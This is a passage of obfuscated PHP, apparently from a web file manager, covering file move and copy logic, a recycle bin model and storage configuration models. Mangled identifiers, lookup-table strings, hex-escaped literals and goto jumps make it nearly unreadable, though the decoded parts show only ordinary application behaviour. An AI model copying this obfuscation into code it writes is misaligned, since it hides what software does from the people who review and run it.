($this->isParentOf($ßù”±¦, $¡£É„›§)) { return !1; } if (!$Ï§øŸÓÛ || !$¡À¯Ø || $¡À¯Ø[$£Ò•Æê¦[487]] != $£Ò•Æê¦[91]) { return !1; } Hook::trigger($£Ò•Æê¦[665], $êŸ„Îéâ); $this->targetIsDelete = intval($Ï§øŸÓÛ[$£Ò•Æê¦[507]]); if ($Ï§øŸÓÛ[$£Ò•Æê¦[192]] == $¡£É„›§ && $”Òƒµ¸Œ != $Ï§øŸÓÛ[$£Ò•Æê¦[32]]) { $¶‹İÓªª = $this->fileNameExist($¡£É„›§, $”Òƒµ¸Œ); if ($¶‹İÓªª && $Ï§øŸÓÛ[$£Ò•Æê¦[487]] == $£Ò•Æê¦[230]) { $‰Ü¥ÓÃ = $this->sourceInfo($¶‹İÓªª); $º —½·´ = $this->fileHistory($‰Ü¥ÓÃ, $Ï§øŸÓÛ[$£Ò•Æê¦[545]], $Ï§øŸÓÛ[$£Ò•Æê¦[79]]); if (!$º —½·´) { Model($£Ò•Æê¦[548])->remove($Ï§øŸÓÛ[$£Ò•Æê¦[545]]); } $this->removeNow($ßù”±¦, !1); $this->folderSizeReset($¡£É„›§); Hook::trigger($£Ò•Æê¦[666], $êŸ„Îéâ); return $¶‹İÓªª; } } $âŸô–º» = $”Òƒµ¸Œ ? $”Òƒµ¸Œ : $Ï§øŸÓÛ[$£Ò•Æê¦[32]]; $this->lockMoveStart($ßù”±¦); $this->lockWriteStart($¡£É„›§, $âŸô–º»); $™ç£¼É = array($£Ò•Æê¦[636] => array(), $£Ò•Æê¦[667] => !1); $this->clearShare($ßù”±¦, $¡£É„›§); $Œê·š™÷ = $this->fileNameExistAuto($¡£É„›§, $Ï§øŸÓÛ); $”„Ì¾ŞÏ = $this->_move($ßù”±¦, $¡£É„›§, $§˜İÔïÑ, $™ç£¼É, $”Òƒµ¸Œ); $this->sourceCacheClear(); if ($Ï§øŸÓÛ[$£Ò•Æê¦[487]] == $£Ò•Æê¦[91] && $Œê·š™÷) { $this->folderSizeResetChildren($”„Ì¾ŞÏ); } Model($£Ò•Æê¦[232])->linkAdd($™ç£¼É[$£Ò•Æê¦[636]]); if ($”„Ì¾ŞÏ && $Œê·š™÷ && $™ç£¼É[$£Ò•Æê¦[667]]) { $©¬²×¶Õ = $Ï§øŸÓÛ[$£Ò•Æê¦[487]] == $£Ò•Æê¦[91] ? $this->_childrenListSelect($ßù”±¦) : !1; $¾°©ööî = $©¬²×¶Õ && count($©¬²×¶Õ) > 0 ? !0 : !1; $this->removeNow($ßù”±¦, $¾°©ööî); } $this->lockMoveEnd($ßù”±¦); $this->lockWriteEnd($¡£É„›§, $âŸô–º»); $this->folderSizeReset($Ï§øŸÓÛ[$£Ò•Æê¦[192]]); $this->folderSizeReset($¡£É„›§); $Íîò¶ = array($Ï§øŸÓÛ[$£Ò•Æê¦[192]], $¡£É„›§); if ($Ï§øŸÓÛ[$£Ò•Æê¦[487]] == $£Ò•Æê¦[91]) { $Íîò¶[] = $ßù”±¦; } $this->updateModifyTime($Íîò¶); Model($£Ò•Æê¦[640])->eventMove($ßù”±¦, $Ï§øŸÓÛ[$£Ò•Æê¦[192]], $¡£É„›§); Hook::trigger($£Ò•Æê¦[666], $êŸ„Îéâ); return $”„Ì¾ŞÏ; } private function _move($†œñˆÖƒ, $€Êî–±, $§Ò¥¾›, &$º¨…é’, $Âçó§Œâ = '') { $ß¹ÊÛº´ =& $_SERVER[°‰†òö¯]; $‰ãÁ¥Œ¿ = $this->sourceInfo($†œñˆÖƒ); $ß¦´üö = $‰ãÁ¥Œ¿[$ß¹ÊÛº´[487]] == $ß¹ÊÛº´[91]; $–‰’´İí = $Âçó§Œâ ? $Âçó§Œâ : $‰ãÁ¥Œ¿[$ß¹ÊÛº´[32]]; $¤øª×ë¥ = $this->fileNameExistAuto($€Êî–±, $‰ãÁ¥Œ¿); $this->lockMoveStart($†œñˆÖƒ); $this->lockWriteStart($€Êî–±, $–‰’´İí); if (!$¤øª×ë¥) { return $this->_moveForce($†œñˆÖƒ, $€Êî–±, $–‰’´İí); } $–¿¡Ù×¯ = $¤øª×ë¥; $–ÙÚš¿å = !1; if ($ß¦´üö) { if ($§Ò¥¾› == REPEAT_RENAME_FOLDER) { $–‰’´İí = $this->fileNameAuto($€Êî–±, $–‰’´İí, $§Ò¥¾›, $ß¦´üö); $–¿¡Ù×¯ = $this->_moveForce($†œñˆÖƒ, $€Êî–±, $–‰’´İí); } else { $ŞñşÚÈÌ = $this->_childrenListSelect($†œñˆÖƒ); foreach ($ŞñşÚÈÌ as $Ñ˜ƒÙˆŠ) { $˜ú¥âÏç = REPEAT_REPLACE; $this->_move($Ñ˜ƒÙˆŠ[$ß¹ÊÛº´[193]], $¤øª×ë¥, $˜ú¥âÏç, $º¨…é’); } $–ÙÚš¿å = !0; } } else { if ($§Ò¥¾› == REPEAT_RENAME || $§Ò¥¾› == REPEAT_RENAME_FOLDER) { $–‰’´İí = $this->fileNameAuto($€Êî–±, $–‰’´İí, $§Ò¥¾›, $ß¦´üö); $–¿¡Ù×¯ = $this->_moveForce($†œñˆÖƒ, $€Êî–±, $–‰’´İí); } else { $¬™œÂƒ™ = $this->sourceInfoCache($¤øª×ë¥); $‡Ê“ãîï = $this->fileHistory($¬™œÂƒ™, $‰ãÁ¥Œ¿[$ß¹ÊÛº´[545]], $‰ãÁ¥Œ¿[$ß¹ÊÛº´[79]]); if ($‡Ê“ãîï) { $º¨…é’[$ß¹ÊÛº´[636]][] = $‰ãÁ¥Œ¿[$ß¹ÊÛº´[545]]; } $–ÙÚš¿å = !0; } } if ($–ÙÚš¿å) { $º¨…é’[$ß¹ÊÛº´[667]] = !0; } return $–¿¡Ù×¯; } private function _moveForce($´å…É¿Ç, $á†‘ı‘, $ûÜŞ) { $—Í£€Í¥ =& $_SERVER[°‰†òö¯]; $áâ³Å = $this->sourceInfo($´å…É¿Ç); $†ÅµÇ Õ = $this->sourceInfo($á†‘ı‘); $¨„‰Ìåª = $áâ³Å[$—Í£€Í¥[487]] == $—Í£€Í¥[91]; $ãø¨†Œ = array($—Í£€Í¥[479] => $†ÅµÇ Õ[$—Í£€Í¥[193]], $—Í£€Í¥[659] => $†ÅµÇ Õ[$—Í£€Í¥[588]] . $†ÅµÇ Õ[$—Í£€Í¥[193]] . $—Í£€Í¥[50], $—Í£€Í¥[655] => $†ÅµÇ Õ[$—Í£€Í¥[190]], $—Í£€Í¥[656] => $†ÅµÇ Õ[$—Í£€Í¥[573]], $—Í£€Í¥[658] => USER_ID, $—Í£€Í¥[496] => $ûÜŞ); $¯ÑĞÚ¦ß = $áâ³Å[$—Í£€Í¥[190]] == SourceModel::TYPE_GROUP && $†ÅµÇ Õ[$—Í£€Í¥[190]] == SourceModel::TYPE_GROUP && $áâ³Å[$—Í£€Í¥[573]] == $†ÅµÇ Õ[$—Í£€Í¥[573]]; if (!$¯ÑĞÚ¦ß && $this->moveClearAuth) { Model($—Í£€Í¥[571])->authClear($´å…É¿Ç); } $Ü¡Š…ª = $áâ³Å[$—Í£€Í¥[507]] == $—Í£€Í¥[91] && $†ÅµÇ Õ[$—Í£€Í¥[507]] != $—Í£€Í¥[91]; if ($Ü¡Š…ª) { $ãø¨†Œ[$—Í£€Í¥[506]] = 0; } if ($¨„‰Ìåª) { $¶ì¯®…Ä = array($—Í£€Í¥[659] => array($—Í£€Í¥[619], $áâ³Å[$—Í£€Í¥[588]] . $áâ³Å[$—Í£€Í¥[193]] . $—Í£€Í¥[620])); $šú‘´õ¶ = $áâ³Å[$—Í£€Í¥[588]] . $áâ³Å[$—Í£€Í¥[193]] . $—Í£€Í¥[50]; $ª’ù˜š• = $†ÅµÇ Õ[$—Í£€Í¥[588]] . $†ÅµÇ Õ[$—Í£€Í¥[193]] . $—Í£€Í¥[50] . $áâ³Å[$—Í£€Í¥[193]] . $—Í£€Í¥[50]; $’§£À—Ù = array($—Í£€Í¥[659] => array($—Í£€Í¥[668], "\x72\x65\x70\154\x61\x63\145\50\x70\x61\x72\x65\x6e\164\114\145\166\x65\x6c\x2c\x27{$šú‘´õ¶}\x27\x2c\47{$ª’ù˜š•}\x27\x29"), $—Í£€Í¥[655] => $†ÅµÇ Õ[$—Í£€Í¥[190]], $—Í£€Í¥[656] => $†ÅµÇ Õ[$—Í£€Í¥[573]]); if ($Ü¡Š…ª) { $’§£À—Ù[$—Í£€Í¥[506]] = 0; } $this->where($¶ì¯®…Ä)->data($’§£À—Ù)->save(); } $this->where(array($—Í£€Í¥[493] => $´å…É¿Ç))->data($ãø¨†Œ)->save(); return $´å…É¿Ç; } private function clearShare($©œ“ë×“, $Óœú…×É) { $§Î«ŞØ± =& $_SERVER[°‰†òö¯]; $¼Ù»¨Ù = $this->sourceInfo($©œ“ë×“); $ŒÅ¨“Œæ = $this->sourceInfo($Óœú…×É); if ($¼Ù»¨Ù[$§Î«ŞØ±[573]] == $ŒÅ¨“Œæ[$§Î«ŞØ±[573]] && $¼Ù»¨Ù[$§Î«ŞØ±[190]] == $§Î«ŞØ±[669]) { return; } $­½‚§ä = array($§Î«ŞØ±[588] => array($§Î«ŞØ±[619], $¼Ù»¨Ù[$§Î«ŞØ±[588]] . $©œ“ë×“ . $§Î«ŞØ±[620])); $ğó©¨¦Á = $this->field($§Î«ŞØ±[493])->where($­½‚§ä)->getField($§Î«ŞØ±[193], !0); if (!$ğó©¨¦Á) { return; } $­½‚§ä = array($§Î«ŞØ±[193] => array($§Î«ŞØ±[7], $ğó©¨¦Á), $§Î«ŞØ±[670] => 1); $á·ÖëèŸ = Model($§Î«ŞØ±[671])->field($§Î«ŞØ±[672])->where($­½‚§ä)->select(); if (!$á·ÖëèŸ) { return; } $á·ÖëèŸ = array_to_keyvalue($á·ÖëèŸ, $§Î«ŞØ±[12], $§Î«ŞØ±[672]); $­½‚§ä = array($§Î«ŞØ±[672] => array($§Î«ŞØ±[7], $á·ÖëèŸ)); Model($§Î«ŞØ±[671])->where($­½‚§ä)->save(array($§Î«ŞØ±[670] => 0)); Model($§Î«ŞØ±[673])->where($­½‚§ä)->delete(); } public function copyFolderFromIO($š¥ë™õ, $›¿¢êôñ, $°Ã…Ğã«, $È¹³Ô°ø, $å¢ªÔú…, $¬‘Ë¡ = false) { $ı§º¶ï¬ =& $_SERVER[°‰†òö¯]; $€ª¢Ê¡ñ = array($ı§º¶ï¬[637] => array(), $ı§º¶ï¬[638] => array(), $ı§º¶ï¬[636] => array(), $ı§º¶ï¬[674] => array()); $‚¦ö‹‡€ = $¬‘Ë¡ ? $¬‘Ë¡ : $š¥ë™õ->pathThis($›¿¢êôñ); $ôéÏÑ§Õ = $this->fileNameExist($°Ã…Ğã«, $‚¦ö‹‡€); $áéÕö³ = $this->mkdir($°Ã…Ğã«, $‚¦ö‹‡€, $È¹³Ô°ø); if (!$ôéÏÑ§Õ || $È¹³Ô°ø == REPEAT_RENAME_FOLDER) { $È¹³Ô°ø = !1; } if ($ôéÏÑ§Õ) { $this->_childrenAllMake($ôéÏÑ§Õ); } Hook::trigger($ı§º¶ï¬[675]); $this->_copyChildTo($š¥ë™õ, $›¿¢êôñ, $áéÕö³, $È¹³Ô°ø, $€ª¢Ê¡ñ, $å¢ªÔú…); Hook::trigger($ı§º¶ï¬[676]); if ($áéÕö³) { $this->folderSizeResetChildren($áéÕö³); } $this->_childrenListClear(); Model($ı§º¶ï¬[639])->addAll($€ª¢Ê¡ñ[$ı§º¶ï¬[637]], array(), !0); Model($ı§º¶ï¬[640])->eventCopy($áéÕö³); $this->saveAll($€ª¢Ê¡ñ[$ı§º¶ï¬[638]]); Model($ı§º¶ï¬[548])->linkAdd($€ª¢Ê¡ñ[$ı§º¶ï¬[636]]); Model($ı§º¶ï¬[548])->remove($€ª¢Ê¡ñ[$ı§º¶ï¬[674]]); $this->folderSizeReset($°Ã…Ğã«); $this->updateModifyTime($°Ã…Ğã«); return $áéÕö³; } private function _copyChildTo($¥ŒËËË§, $úáõıÕú, $ğÌ¬¶ÆŸ, $‘Ñ‚¥Ææ, &$´­ííö, $ãÀ¬çì) { $¬ÈâÛ¢Û =& $_SERVER[°‰†òö¯]; $‹‚Ê— = $this->sourceInfoCache($ğÌ¬¶ÆŸ); $€ÇÇûÇğ = $¥ŒËËË§->listPath($úáõıÕú); $€ÇÇûÇğ = $€ÇÇûÇğ ? $€ÇÇûÇğ : array($¬ÈâÛ¢Û[86] => array(), $¬ÈâÛ¢Û[85] => array()); $£²Äú´ = array_merge($€ÇÇûÇğ[$¬ÈâÛ¢Û[86]], $€ÇÇûÇğ[$¬ÈâÛ¢Û[85]]); $Ä±æƒË¥ = $this->_addFiles($¥ŒËËË§, $€ÇÇûÇğ[$¬ÈâÛ¢Û[86]], $ãÀ¬çì); $¢âèÒ…Ì = array(); foreach ($£²Äú´ as &$µ˜Ñîîü) { if (isset($Ä±æƒË¥[$µ˜Ñîîü[$¬ÈâÛ¢Û[32]]])) { $µ˜Ñîîü = $Ä±æƒË¥[$µ˜Ñîîü[$¬ÈâÛ¢Û[32]]]; } $µ˜Ñîîü[$¬ÈâÛ¢Û[487]] = $µ˜Ñîîü[$¬ÈâÛ¢Û[33]] == $¬ÈâÛ¢Û[78]; $µ˜Ñîîü[$¬ÈâÛ¢Û[488]] = substr(_get($µ˜Ñîîü, $¬ÈâÛ¢Û[169], $¬ÈâÛ¢Û[12]), 0, 10); $µ˜Ñîîü[$¬ÈâÛ¢Û[79]] = _get($µ˜Ñîîü, $¬ÈâÛ¢Û[79], 0); $µ˜Ñîîü[$¬ÈâÛ¢Û[545]] = _get($µ˜Ñîîü, $¬ÈâÛ¢Û[545], 0); if (!isset($µ˜Ñîîü[$¬ÈâÛ¢Û[677]]) && $µ˜Ñîîü[$¬ÈâÛ¢Û[545]]) { $´­ííö[$¬ÈâÛ¢Û[674]][] = $µ˜Ñîîü[$¬ÈâÛ¢Û[545]]; } if ($‘Ñ‚¥Ææ) { $–¦’³‰” = $this->fileNameExistCache($ğÌ¬¶ÆŸ, $µ˜Ñîîü[$¬ÈâÛ¢Û[32]]); if ($–¦’³‰”) { if ($µ˜Ñîîü[$¬ÈâÛ¢Û[487]] || $‘Ñ‚¥Ææ == REPEAT_SKIP) { continue; } if ($‘Ñ‚¥Ææ == REPEAT_REPLACE) { $Øïä¤›¤ = $this->sourceInfoCache($–¦’³‰”); $ÑÂê’…Ä = $this->fileHistory($Øïä¤›¤, $µ˜Ñîîü[$¬ÈâÛ¢Û[545]], $µ˜Ñîîü[$¬ÈâÛ¢Û[79]]); if ($ÑÂê’…Ä) { $´­ííö[$¬ÈâÛ¢Û[636]][] = $µ˜Ñîîü[$¬ÈâÛ¢Û[545]]; } continue; } else { if ($‘Ñ‚¥Ææ == REPEAT_RENAME) { $µ˜Ñîîü[$¬ÈâÛ¢Û[32]] = $this->fileNameAutoCache($ğÌ¬¶ÆŸ, $µ˜Ñîîü[$¬ÈâÛ¢Û[32]], $‘Ñ‚¥Ææ, !1); } } } } if (!$µ˜Ñîîü[$¬ÈâÛ¢Û[487]] && $µ˜Ñîîü[$¬ÈâÛ¢Û[545]] == 0) { continue; } if (!$µ˜Ñîîü[$¬ÈâÛ¢Û[487]] && $µ˜Ñîîü[$¬ÈâÛ¢Û[545]]) { $´­ííö[$¬ÈâÛ¢Û[636]][] = $µ˜Ñîîü[$¬ÈâÛ¢Û[545]]; } $¢âèÒ…Ì[] = $this->_makeItemData($µ˜Ñîîü, $‹‚Ê—, $µ˜Ñîîü[$¬ÈâÛ¢Û[32]]); } unset($µ˜Ñîîü); if (!empty($¢âèÒ…Ì)) { $this->addAll($¢âèÒ…Ì); $this->_childrenListSelect($ğÌ¬¶ÆŸ); } $ÌÍ£”Ãô = $this->_childrenList($ğÌ¬¶ÆŸ); $ÌÍ£”Ãô = array_to_keyvalue($ÌÍ£”Ãô, $¬ÈâÛ¢Û[32]); foreach ($£²Äú´ as $µ˜Ñîîü) { $Øïä¤›¤ = $ÌÍ£”Ãô[$µ˜Ñîîü[$¬ÈâÛ¢Û[32]]]; $¸–”¡Ì = $Øïä¤›¤[$¬ÈâÛ¢Û[193]]; $this->_copyApplyMeta($Øïä¤›¤, $´­ííö); if ($µ˜Ñîîü[$¬ÈâÛ¢Û[33]] == $¬ÈâÛ¢Û[78]) { $µ˜Ñîîü[$¬ÈâÛ¢Û[87]] = $¥ŒËËË§->getPathInner($µ˜Ñîîü[$¬ÈâÛ¢Û[87]]); $this->_copyChildTo($¥ŒËËË§, $µ˜Ñîîü[$¬ÈâÛ¢Û[87]], $¸–”¡Ì, $‘Ñ‚¥Ææ, $´­ííö, $ãÀ¬çì); } } } private function _addFiles($˜ÌÊê‡å, $ã¾œ»…ù, $Ã…¦ò²á) { $Çã¿áÔ =& $_SERVER[°‰†òö¯]; if (!$ã¾œ»…ù || count($ã¾œ»…ù) == 0) { return array(); } $Ø¯ƒ…ç³ = array(); foreach ($ã¾œ»…ù as &$®ÍëóÔ) { Hook::trigger($Çã¿áÔ[678], $®ÍëóÔ); $®ÍëóÔ[$Çã¿áÔ[87]] = $˜ÌÊê‡å->getPathInner($®ÍëóÔ[$Çã¿áÔ[87]]); $ÊúĞ¿ Å = $˜ÌÊê‡å->hashSimple($®ÍëóÔ[$Çã¿áÔ[87]]); $¯…ëŞëõ = $˜ÌÊê‡å->hashMd5($®ÍëóÔ[$Çã¿áÔ[87]]); if (strlen($¯…ëŞëõ) > 10 && !isset($Ø¯ƒ…ç³[$¯…ëŞëõ])) { $Ø¯ƒ…ç³[$¯…ëŞëõ] = array(); } $®ÍëóÔ[$Çã¿áÔ[679]] = $ÊúĞ¿ Å; $®ÍëóÔ[$Çã¿áÔ[551]] = $¯…ëŞëõ; $Ø¯ƒ…ç³[$¯…ëŞëõ][] =& $®ÍëóÔ; if (count($Ø¯ƒ…ç³[$¯…ëŞëõ]) > 1) { $®ÍëóÔ[$Çã¿áÔ[677]] = !0; } Hook::trigger($Çã¿áÔ[680], $®ÍëóÔ); } unset($®ÍëóÔ); $­­åÆï— = array($Çã¿áÔ[551] => array($Çã¿áÔ[7], array_keys($Ø¯ƒ…ç³))); $ƒÄ÷Ô„ü = Model($Çã¿áÔ[681]); $€ÃÒ•’ˆ = $ƒÄ÷Ô„ü->where($­­åÆï—)->select(); $€ÃÒ•’ˆ = $€ÃÒ•’ˆ ? $€ÃÒ•’ˆ : array(); foreach ($€ÃÒ•’ˆ as $Û¯ë²­”) { if (!isset($Ø¯ƒ…ç³[$Û¯ë²­”[$Çã¿áÔ[551]]])) { continue; } $ÚÁÇ¶€ = $Ø¯ƒ…ç³[$Û¯ë²­”[$Çã¿áÔ[551]]]; foreach ($ÚÁÇ¶€ as &$®ÍëóÔ) { $®ÍëóÔ[$Çã¿áÔ[545]] = $Û¯ë²­”[$Çã¿áÔ[545]]; $®ÍëóÔ[$Çã¿áÔ[677]] = !0; } unset($®ÍëóÔ); } $ì‡üä¼ª = array(); foreach ($ã¾œ»…ù as $……£åù÷) { Hook::trigger($Çã¿áÔ[682], $……£åù÷); if (isset($……£åù÷[$Çã¿áÔ[677]]) && $……£åù÷[$Çã¿áÔ[677]]) { Hook::trigger($Çã¿áÔ[683], $……£åù÷); continue; } $º˜áŒÄ· = $˜ÌÊê‡å->getPathInner($……£åù÷[$Çã¿áÔ[87]]); $êÜ†Š¸ = $ƒÄ÷Ô„ü->addFileMake($º˜áŒÄ·, $……£åù÷[$Çã¿áÔ[79]], $……£åù÷[$Çã¿áÔ[679]], $……£åù÷[$Çã¿áÔ[551]], $……£åù÷[$Çã¿áÔ[32]], $Ã…¦ò²á); Hook::trigger($Çã¿áÔ[683], $……£åù÷); if (!is_array($êÜ†Š¸)) { continue; } $ì‡üä¼ª[] = $êÜ†Š¸; } $ƒÄ÷Ô„ü->addAll($ì‡üä¼ª); $­­åÆï— = array($Çã¿áÔ[551] => array($Çã¿áÔ[7], array_keys($Ø¯ƒ…ç³))); $€ÃÒ•’ˆ = $ƒÄ÷Ô„ü->where($­­åÆï—)->select(); $€ÃÒ•’ˆ = $€ÃÒ•’ˆ ? $€ÃÒ•’ˆ : array(); foreach ($€ÃÒ•’ˆ as $Û¯ë²­”) { if (!isset($Ø¯ƒ…ç³[$Û¯ë²­”[$Çã¿áÔ[551]]])) { continue; } $„¡ÒÏóğ =& $Ø¯ƒ…ç³[$Û¯ë²­”[$Çã¿áÔ[551]]]; foreach ($„¡ÒÏóğ as &$®ÍëóÔ) { $®ÍëóÔ[$Çã¿áÔ[545]] = $Û¯ë²­”[$Çã¿áÔ[545]]; } unset($®ÍëóÔ); } $œ¢ªãß = array(); foreach ($ã¾œ»…ù as $èÓÄÀ‹) { $œ¢ªãß[$èÓÄÀ‹[$Çã¿áÔ[32]]] = $èÓÄÀ‹; } return $œ¢ªãß; } } define($_SERVER[°‰†òö¯][684], $_SERVER[°‰†òö¯][685]); $voegysalfb = $_SERVER[°‰†òö¯][686]; goto fŒ÷©Ü¤†; dØ£Îå¾¦: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\162\143\145\137\162\x65\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\x54\x69\155\x65", "\x74\x69\x6d\145", "\x69\x6e\163\x65\x72\x74", "\x66\x75\x6e\x63\x74\x69\157\x6e")); public function listData($ß£äšÔ = false) { $Ä°¨–  =& $_SERVER[°‰†òö¯]; $ß£äšÔ = $ß£äšÔ ? $ß£äšÔ : USER_ID; $€“¥–ÎÁ = $this->where(array($Ä°¨– [1762] => $ß£äšÔ))->select(); return array_to_keyvalue($€“¥–ÎÁ, $Ä°¨– [12], $Ä°¨– [193]); } public function moveToRecycle($¸ÍüŒÙñ) { $â÷è½ =& $_SERVER[°‰†òö¯]; $†ŒÅ³¾à = Model($â÷è½[1419]); $ƒßÌ§êò = $†ŒÅ³¾à->sourceInfo($¸ÍüŒÙñ); if (!$ƒßÌ§êò || $ƒßÌ§êò[$â÷è½[507]] == $â÷è½[91]) { return; } $Øµ‘ò = array($â÷è½[493] => $¸ÍüŒÙñ, $â÷è½[1762] => USER_ID, $â÷è½[655] => $ƒßÌ§êò[$â÷è½[190]], $â÷è½[656] => $ƒßÌ§êò[$â÷è½[573]], $â÷è½[659] => $ƒßÌ§êò[$â÷è½[588]]); $this->add($Øµ‘ò); $this->recycleMove($¸ÍüŒÙñ, 1); if ($ƒßÌ§êò[$â÷è½[487]] == $â÷è½[91]) { $À¾ÊĞ®¡ = array($â÷è½[659] => array($â÷è½[619], $ƒßÌ§êò[$â÷è½[588]] . $¸ÍüŒÙñ . $â÷è½[620])); $†ŒÅ³¾à->where($À¾ÊĞ®¡)->setField($â÷è½[507], 1); } } public function clear() { $this->remove(!1); } public function remove($Üİâõ÷ = false, $±Ô€Àù = false) { $ûÑöÒë =& $_SERVER[°‰†òö¯]; $±Ô€Àù = $±Ô€Àù ? $±Ô€Àù : USER_ID; $ÖµÎÙ–ù = Model($ûÑöÒë[1419]); $ş¯Ö¿® = $this->listData($±Ô€Àù); $Üİâõ÷ = $Üİâõ÷ === !1 ? !1 : $Üİâõ÷; $İãğ£¸ = array(); foreach ($ş¯Ö¿® as $±·´ñç†) { if ($Üİâõ÷ != !1 && !in_array($±·´ñç†, $Üİâõ÷)) { continue; } $×ˆ§Á = $ÖµÎÙ–ù->sourceInfo($±·´ñç†); $ÖµÎÙ–ù->remove($±·´ñç†, !1); $õôå¶½î = $×ˆ§Á[$ûÑöÒë[190]] . $ûÑöÒë[11] . $×ˆ§Á[$ûÑöÒë[573]]; $İãğ£¸[$õôå¶½î] = array($ûÑöÒë[655] => $×ˆ§Á[$ûÑöÒë[190]], $ûÑöÒë[573] => $×ˆ§Á[$ûÑöÒë[573]]); $this->where(array($ûÑöÒë[193] => $±·´ñç†))->delete(); } foreach ($İãğ£¸ as $ÌÜÓ¿œ‰) { $ÖµÎÙ–ù->targetSpaceUpdate($ÌÜÓ¿œ‰[$ûÑöÒë[190]], $ÌÜÓ¿œ‰[$ûÑöÒë[573]]); } } public function restore($ùü’ôË€ = false) { $²¬ï¸Éö = $this->listData(); $this->_restoreSource($²¬ï¸Éö, $ùü’ôË€); } public function removeUserAll($²õíÊÙ) { $this->remove(!1, $²õíÊÙ); } public function restoreItem($×…¦âÓæ) { $this->_restoreSource(array($×…¦âÓæ), array($×…¦âÓæ)); } private function _restoreSource($Ğ¢ıúü«, $‘»’£) { $´¤¢£ı• =& $_SERVER[°‰†òö¯]; $£àŞÏç = Model($´¤¢£ı•[1419]); $‘»’£ = $‘»’£ == !1 ? !1 : $‘»’£; if (!$Ğ¢ıúü«) { return !0; } $å±è©áï = array(); foreach ($Ğ¢ıúü« as $ûàêÕ‚) { if ($‘»’£ != !1 && !in_array($ûàêÕ‚, $‘»’£)) { continue; } $¼„è­ÍÜ = $£àŞÏç->sourceInfo($ûàêÕ‚); $éõ®–§ò = $£àŞÏç->sourceInfo($¼„è­ÍÜ[$´¤¢£ı•[192]]); if ($éõ®–§ò[$´¤¢£ı•[507]] == $´¤¢£ı•[91]) { continue; } $£àŞÏç->lockMoveStart($ûàêÕ‚); $this->recycleMove($ûàêÕ‚, 0); if ($¼„è­ÍÜ[$´¤¢£ı•[487]] == $´¤¢£ı•[91]) { $ò¹Ö£µ† = array($´¤¢£ı•[659] => array($´¤¢£ı•[619], $¼„è­ÍÜ[$´¤¢£ı•[588]] . $ûàêÕ‚ . $´¤¢£ı•[620])); $£àŞÏç->where($ò¹Ö£µ†)->setField($´¤¢£ı•[507], 0); $this->restoreFolderChildren($ûàêÕ‚, $Ğ¢ıúü«); } $this->where(array($´¤¢£ı•[193] => $ûàêÕ‚))->delete(); $£àŞÏç->folderSizeReset($¼„è­ÍÜ[$´¤¢£ı•[192]]); $å±è©áï[] = $¼„è­ÍÜ[$´¤¢£ı•[192]]; if ($¼„è­ÍÜ[$´¤¢£ı•[487]] == $´¤¢£ı•[91]) { $å±è©áï[] = $ûàêÕ‚; } $£àŞÏç->lockMoveEnd($ûàêÕ‚); } $£àŞÏç->updateModifyTime($å±è©áï); } private function restoreFolderChildren($ç’åØü¨, $›ŸÌƒï¸) { $ã§´ÌØ =& $_SERVER[°‰†òö¯]; $ù»›‚³Ì = Model($ã§´ÌØ[1419]); $Œ¾«—Ôö = array($ã§´ÌØ[193] => array($ã§´ÌØ[7], array())); foreach ($›ŸÌƒï¸ as $´Ïë×ó) { if ($´Ïë×ó == $ç’åØü¨) { continue; } if (!$ù»›‚³Ì->isParentOf($ç’åØü¨, $´Ïë×ó)) { continue; } $Ìßˆ†ç˜ = $ù»›‚³Ì->sourceInfo($´Ïë×ó); if ($Ìßˆ†ç˜[$ã§´ÌØ[487]] == $ã§´ÌØ[91]) { $Œ¾«—Ôö[] = array($ã§´ÌØ[659] => array($ã§´ÌØ[619], $Ìßˆ†ç˜[$ã§´ÌØ[588]] . $´Ïë×ó . $ã§´ÌØ[620])); } else { $Œ¾«—Ôö[$ã§´ÌØ[193]][1][] = $´Ïë×ó; } } if (!$Œ¾«—Ôö[$ã§´ÌØ[193]][1]) { unset($Œ¾«—Ôö[$ã§´ÌØ[193]]); } if (!$Œ¾«—Ôö) { return; } if (is_array($Œ¾«—Ôö[$ã§´ÌØ[193]]) && is_array($Œ¾«—Ôö[$ã§´ÌØ[193]][1])) { $Œ¾«—Ôö[$ã§´ÌØ[193]][1] = array_unique($Œ¾«—Ôö[$ã§´ÌØ[193]][1]); } $Œ¾«—Ôö[$ã§´ÌØ[1075]] = $ã§´ÌØ[2074]; $ù»›‚³Ì->where($Œ¾«—Ôö)->setField($ã§´ÌØ[507], 1); } private function recycleMove($…²™¤ˆ³, $’©İ¦˜ = 1) { $âñ¼âóş =& $_SERVER[°‰†òö¯]; $¬°§©ãÊ = Model($âñ¼âóş[1419]); $†æÛêí = Model($âñ¼âóş[2306]); $ÇìÇÂÈà = array($âñ¼âóş[193] => $…²™¤ˆ³); if ($’©İ¦˜) { $¬°§©ãÊ->where($ÇìÇÂÈà)->setField($âñ¼âóş[507], 1); $†æÛêí->eventRecycle($…²™¤ˆ³, $âñ¼âóş[2307]); } else { $ªÆÕíŸ = $¬°§©ãÊ->where($ÇìÇÂÈà)->find(); $·‹¿¿ğ˜ = $ªÆÕíŸ[$âñ¼âóş[487]] == $âñ¼âóş[91]; $™°ö•© = $¬°§©ãÊ->fileNameAuto($ªÆÕíŸ[$âñ¼âóş[192]], $ªÆÕíŸ[$âñ¼âóş[32]], REPEAT_RENAME_FOLDER, $·‹¿¿ğ˜); if ($™°ö•© != $ªÆÕíŸ[$âñ¼âóş[32]]) { $¬°§©ãÊ->rename($…²™¤ˆ³, $™°ö•©); } $¬°§©ãÊ->where($ÇìÇÂÈà)->setField($âñ¼âóş[507], 0); $†æÛêí->eventRecycle($…²™¤ˆ³, $âñ¼âóş[2308]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\163\x6f\x75\162\x63\x65\x53\x65\x63\x72\x65\164\x4c\x69\x73\x74"; public $field = array("\x73\157\x75\x72\143\145\111\104", "\164\x79\160\145\111\104", "\x63\162\145\141\x74\145\125\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x73\x74\157\162\x61\147\145\114\x69\163\164"; public $field = array("\156\141\155\145", "\x73\x69\x7a\x65\115\x61\170", "\163\171\163\164\145\x6d", "\144\145\x66\141\165\x6c\164", "\x64\162\x69\166\145\162", "\143\x6f\x6e\x66\151\x67"); public function listData($­ò•ƒ’ö = false, $æÏèÆÖÔ = "\x6d\x6f\x64\x69\x66\171\124\151\155\145", $¤¤©×á = false) { $ó–ºŞêş =& 